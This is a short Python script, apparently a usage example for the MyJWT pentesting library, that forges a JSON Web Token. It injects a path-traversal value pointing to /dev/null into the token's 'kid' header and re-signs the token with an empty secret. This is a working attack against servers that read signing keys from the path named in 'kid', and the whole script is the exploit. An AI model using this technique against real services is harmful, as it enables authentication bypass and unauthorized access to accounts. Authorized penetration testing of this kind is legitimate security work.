from MyJWT.modifyJWT import signature
from MyJWT.utils import jwtToJson
from MyJWT.vulnerabilities import injectSqlKid

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
# Header: {"typ": "JWT", "alg": "HS256", "kid": "key1"}
# Payload: {"user": null}
# Signature: "2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
injection = "../../../../../../dev/null"
# your injection
sign = ""
# empty signature
jwt = injectSqlKid(jwt, injection)
# inject your payload in kid key
jwt = signature(jwtToJson(jwt), sign)
# after your jwt header changed re-sign your jwt
print(jwt)
